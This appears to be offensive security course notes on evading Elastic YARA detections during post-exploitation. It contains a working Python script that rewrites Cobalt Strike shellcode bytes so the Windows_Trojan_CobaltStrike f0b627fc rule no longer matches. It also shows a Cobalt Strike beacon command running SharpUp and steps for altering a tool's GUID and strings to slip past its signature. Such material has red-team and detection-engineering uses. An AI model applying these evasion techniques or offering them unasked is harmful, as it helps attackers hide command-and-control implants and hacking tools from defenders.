
# Shellcode Loader f0b627fc_bypass

The below code replaces bytes found in the headers of shellcode which would regularly trigger the yara rule for `Windows_Trojan_CobaltStrike - f0b627fc`. All credit goes to WKL-Sec for this, which can be found at their GitHub here: [Malleable-CS-Profiles/rule_f0b627fc_bypass.py at main · WKL-Sec/Malleable-CS-Profiles](https://github.com/WKL-Sec/Malleable-CS-Profiles/blob/main/rule_f0b627fc_bypass.py)

```Python
import sys

def replace_bytes(input_filename, output_filename):
    search_bytes      = b"\x25\xff\xff\xff\x00\x3d\x41\x41\x41\x00"
    replacement_bytes = b"\xb8\x41\x41\x41\x00\x3D\x41\x41\x41\x00"
  
    with open(input_filename, "rb") as input_file:
        content = input_file.read()
        modified_content = content.replace(search_bytes, replacement_bytes)
    
    with open(output_filename, "wb") as output_file:
        output_file.write(modified_content)
    
    print(f"Replacement complete. Modified content saved to {output_filename}.")

if len(sys.argv) == 2:
    input_filename = sys.argv[1]
    output_filename = "output.bin"
    replace_bytes(input_filename, output_filename)
else:
    print("No arguments provided")

#find
#25 FF FF FF 00 3D 41 41 41 00
#and eax,0xffffff
#cmp eax,0x414141

#replace to
#b8 41 41 41 00 3d 41 41 41 00
#mov eax,0x414141
#cmp eax,0x414141 
```

# Tool Signatures

Many of the tools utilized for post-exploitation activity will generally be flagged - just due to the signature of the actual tool itself. Take the detection of`SharpUp` as seen below.

```
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
```

![](https://files.cdn.thinkific.com/file_uploads/584845/images/87b/31b/7ea/sharpup.png)

We can see the respective yara rule that applies to the `SharpUp` tool.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/dd6/87d/337/sharpup-yara.png)

The main focal point here are the `strings` and `condition`, which both represent the actual strings that cause the `yara` rule to be detected and the `condition` that applies to how Elastic will determine that it is malicious. In the screenshot above, a successful detection of the tool would mean that just the `guid` or any of the `str0-2` (along with 1 indication of `print_str1-3`).

If we modify any of these values to bypass this condition, then Elastic will effectively not be able to detect our tool. This does not mean that it is immune to any other Elastic detections, as there could be in-memory actions that would still be flagged by EDR.

Luckily enough, values such as the binary's GUID can be easily modified in its source code.

The GUID can be found in `AssemblyInfo.cs`.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/b09/9d1/635/sharpup-guid.png)

This can be replaced with another randomly generated GUID - very easy to do in PowerShell.

```
PS C:\> [Guid]::NewGuid()

Guid
----
a57e5271-3d8a-44c5-8b53-e38f19ca8a63
```

Other tools may need further modification to bypass a Yara rule. See the list below:

[protections-artifacts/yara/rules/Windows_Hacktool_SharpUp.yar at main · elastic/protections-artifacts](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_SharpUp.yar)

